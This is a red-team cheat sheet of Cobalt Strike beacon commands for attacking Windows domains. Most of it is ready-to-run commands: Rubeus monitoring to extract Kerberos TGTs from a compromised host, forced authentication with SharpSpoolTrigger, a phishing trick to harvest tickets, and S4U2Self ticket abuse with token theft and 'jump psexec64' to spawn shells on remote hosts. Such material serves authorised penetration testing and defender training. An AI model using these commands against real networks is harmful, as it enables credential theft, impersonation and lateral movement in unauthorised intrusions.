# Commands Cheat Sheet



{% embed url="https://swisskyrepo.github.io/InternalAllTheThings/command-control/cobalt-strike/" %}

##

## Windows Command Line tools

### Debugging & Helper commands.

#### View error message

```powershell
[-] could not upload file: 32 - ERROR_SHARING_VIOLATION
C:\>net helpmsg 32
The process cannot access the file because it is being used by another process.
```

### Recon & Enumeration (Windows)

#### List named pipes (SMB)

```powershell
PS C:\> ls \\.\pipe\
```

#### tcp connections

```powershell
PS> netstat -anop tcp
```

```powershell
PS> netstat -anop tcp | findstr 1337
```



## Kerberos Tickets

### Extract TGT's from compromised host

#### Rubeus

```sh
beacon> execute-assembly C:\Tools\Rubeus.exe monitor /interval:10 /nowrap
beacon> jobkill
```

### Request NetOnly Kerberos Ticket

#### Rubeus

Below will open a command prompt with the NetOnly ticket. We can then use steal\_token \<PID> and impersonate that user.

```sh
beacon> execute-assembly C:\Tools\Rubeus.exe createnetonly /
program:C:\Windows\System32\cmd.exe /ticket<user-ticket>
```

## Coerce Host Authentication

If we compromised a host, we can try to force an authentication attempt or phish a user to harvest TGTs.

#### SharpSpoolTriggers

```
beacon> execute-assembly C:\Tools\Rubeus.exe monitor /interval:10 /nowrap
beacon> execute-assembly C:\Tools\SharpSpoolTrigger.exe <target-hostname> <compromised-hostname>
```

#### Phishing

We can use Rubeus monitor and send an email to trick a user into authenticating or clicking on a host. The interaction can be as simple as including `dir \\comromised-host`

### Using Kerberos Tickets to spawn remote shell

#### TGT

```sh
// Rubeus triage, dump or monitor to get a TGT.

beacon> execute-assembly C:\Tools\Rubeus.exe createnetonly 
/program:C:\Windows\System32\cmd.exe /ticket:<remote host users TGT>

beacon> steal_token <PID>

beacon> jump psexec64 <remote host FQDN> smb
```



#### TGS (S4U2Self Trick)

```sh
// Rubeus triage, dump or monitor to get TGT
// Get TGS from TGT

Method 1: Get TGS, create sacrificial login, and steal token.

beacon> execute-assembly C:\Tools\Rubeus.exe s4u /impersonateuser:cfoxy /self 
/altservice:cifs/<host-FQDN> /user:dc-2$ /ticket:doIFuj[...]lDLklP /nowrap

beacon> execute-assembly C:\Tools\Rubeus\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe 
/domain:ROTTA /username:cfoxy /password:FakePass /ticket:doIFyD[...]MuaW8=

beacon> steal_token <PID>

beacon> jump psexec64 <remote host FQDN> smb

------------------------------------------------------------------------------------------

Method 2: (Create sacrificial login session first and pass to s4u

beacon> execute-assembly C:\Tools\Rubeus\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe 
/domain:ROTTA /username:cfoxy /password:FakePass /ticket:doIFyD[...]MuaW8=

beacon> execute-assembly C:\Tools\Rubeus.exe s4u /impersonateuser:cfoxy /self 
/altservice:cifs/<host-FQDN> /user:dc-2$ /ticket:doIFuj[...]lDLklP /self /ptt

beacon> run klist
beacon> ls \\<remote-host-FQDN>
beacon> jump psexec64 <remote host FQDN> smb
```
